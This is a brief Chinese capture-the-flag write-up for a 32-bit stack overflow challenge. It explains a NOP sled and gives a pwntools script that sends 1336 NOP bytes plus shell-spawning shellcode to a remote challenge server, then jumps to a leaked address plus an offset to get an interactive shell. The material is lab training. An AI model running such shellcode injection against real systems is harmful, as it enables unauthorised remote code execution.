# 挑战简介
32bit nop sled

# 思路
nop sled,nop('\x90')意为空值，一般代码执行到nop时，会自动跳过并执行下一条指令，是一个很好的覆盖值  

此题有一个基本的栈溢出，但是有一个随机值函数  
```
rand() % 1337 - 668
```

结果大致为[-668，668]  

所以我们的返回地址要保留一个偏移量668

看变量栈溢出位置0x15+0x8，wp说还要加个0x10，有点没弄懂  

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='i386', log_level='debug')

p = remote("pwn.challenge.ctf.show",28146)
elf = ELF('D:\edge 下载\pwn')

shellcode = asm(shellcraft.sh())

len_nop = 1336

p.recvuntil(b'location: ')

addr = eval(p.recvuntil(b'\n', drop = True))

shell_addr = addr + 668 + 0x2d

shellcode = len_nop * b'\x90' + shellcode

p.sendline(shellcode)

p.sendline(hex(shell_addr)) 

p.interactive()

```
